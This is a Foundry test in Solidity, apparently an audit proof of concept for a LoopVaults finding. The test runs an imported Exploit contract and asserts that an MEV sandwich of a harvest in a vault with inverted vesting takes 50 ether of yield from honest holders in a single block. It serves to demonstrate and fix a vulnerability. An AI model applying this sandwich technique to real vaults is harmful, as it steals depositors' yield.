// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, LoopVault, MiniToken} from "./58543-h-01-incorrect-vesting-interest-calculation-enables-mev-atta.sol";

// LoopVaults H-01 (finding 58543): `_vestingInterest()` is inverted, returning 0
// right after a harvest (block.timestamp == lastUpdate) instead of the full amount.
// So totalAssets() counts freshly harvested interest immediately, and an MEV bot
// sandwiches the harvest (deposit before, redeem after — same block) to steal a
// pro-rata slice of the yield from honest holders. Correct vesting => zero profit.
contract Finding58543Test is Test {
    function test_exploit_invertedVesting_mevSandwich() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("attacker deposited", e.depositedByAttacker());
        emit log_named_uint("attacker withdrew ", e.withdrawnByAttacker());
        emit log_named_uint("attacker profit   ", e.profit());
        emit log_named_uint("victim shortfall  ", e.victimShortfall());

        // attacker took real yield with zero time at risk (pure MEV sandwich)
        assertEq(e.depositedByAttacker(), 1000 ether, "attacker deposited 1000e18");
        assertEq(e.withdrawnByAttacker(), 1050 ether, "attacker redeemed 1050e18 same block");
        assertEq(e.profit(), 50 ether, "attacker captured half the 100e18 yield");
        assertEq(e.victimShortfall(), 50 ether, "honest holder lost half the yield");
        assertGt(e.profit(), 0, "with correct vesting profit would be 0");
    }
}
